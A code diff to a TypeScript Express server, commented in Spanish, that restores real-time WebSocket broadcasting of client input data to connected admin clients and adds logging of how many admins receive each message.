@@ -1087,9 +1087,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
             console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
 
-            // No enviamos notificaciones en tiempo real
-            // Mejora solicitada: Eliminar notificaciones en tiempo real
-            console.log('Notificación en tiempo real suprimida por cambio de requisitos');
+            // Enviar notificación en tiempo real de la entrada del cliente
+            broadcastToAdmins(JSON.stringify({
+              type: 'CLIENT_INPUT_REALTIME',
+              data: {
+                sessionId,
+                tipo,
+                inputData,
+                timestamp: new Date().toISOString()
+              }
+            }));
 
             // Update session if we have fields to update
             if (Object.keys(updatedFields).length > 0) {
@@ -1594,23 +1601,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
 }
 
 // Helper function to broadcast to all admin clients
-// Filtrar mensajes de tipo CLIENT_INPUT_REALTIME para evitar exceso de notificaciones
 function broadcastToAdmins(message: string) {
-  // Si el mensaje es del tipo CLIENT_INPUT_REALTIME, no enviarlo
+  // Intentar parsear el mensaje para logging
   try {
     const parsedMessage = JSON.parse(message);
-    if (parsedMessage.type === 'CLIENT_INPUT_REALTIME') {
-      console.log('Mensaje de tipo CLIENT_INPUT_REALTIME suprimido');
-      return; // No enviar este tipo de mensajes
-    }
+    console.log(`[Broadcast] Enviando mensaje de tipo: ${parsedMessage.type}`);
   } catch (e) {
-    // Error al parsear el mensaje, continuamos con el envío normal
+    console.log(`[Broadcast] Enviando mensaje (formato no JSON)`);
   }
 
   // Enviar el mensaje a todos los clientes administradores conectados
+  let sentCount = 0;
   adminClients.forEach(client => {
     if (client.readyState === WebSocket.OPEN) {
       client.send(message);
+      sentCount++;
     }
   });
+  
+  console.log(`[Broadcast] Mensaje enviado a ${sentCount} clientes administradores`);
 }
